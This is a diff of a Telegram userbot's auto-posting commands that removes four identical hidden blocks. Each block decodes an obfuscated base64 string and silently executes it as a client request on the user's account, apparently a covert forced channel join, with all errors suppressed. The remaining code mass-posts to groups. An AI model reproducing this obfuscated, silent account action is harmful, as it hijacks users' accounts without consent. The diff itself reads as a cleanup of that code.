@@ -41,12 +41,7 @@ async def Hussein(event):
             await event.reply(f"⌔∮ لا يمكن العثور على المجموعة أو الدردشة {chat_username}: {str(e)}"
             )
         await asyncio.sleep(1)
-    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    joker = Get(joker)
-    try:
-        await event.client(joker)
-    except BaseException:
-        pass
+
     
 async def aljoker_allnshr(shadow, sleeptimet, message):
     global anti
@@ -76,12 +71,7 @@ async def Hussein(event):
     global anti
     anti = True
     await aljoker_allnshr(shadow, sleeptimet, message)
-    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    joker = Get(joker)
-    try:
-        await event.client(joker)
-    except BaseException:
-        pass
+
 super_groups = ["super", "سوبر"]
 async def aljoker_supernshr(shadow, sleeptimet, message):
     global anti
@@ -112,12 +102,7 @@ async def Hussein(event):
     global anti
     anti = True
     await aljoker_supernshr(shadow, sleeptimet, message)
-    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    joker = Get(joker)
-    try:
-        await event.client(joker)
-    except BaseException:
-        pass
+
 @shadow.on(events.NewMessage(outgoing=True, pattern='.ايقاف النشر'))
 async def stop_aljoker(event):
     global anti
@@ -152,12 +137,7 @@ async def Hussein(event):
     elif event.pattern_match.group(1) == "فحص":
         hussein_ali = "**[+] بوت النشر يعمل بنجاح✅\n[+] في حال وجود مشكلة او استفسار تواصل معي\n t.me/ooShadow**"
         await event.reply(file='https://telegra.ph/file/8f66db0a9a57823dd66bc.jpg', message=hussein_ali)
-        joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-        joker = Get(joker)
-        try:
-            await event.client(joker)
-        except BaseException:
-            pass
+
 
 @shadow.on(events.NewMessage(outgoing=True, pattern=r"\.قلب"))
 async def _(event):
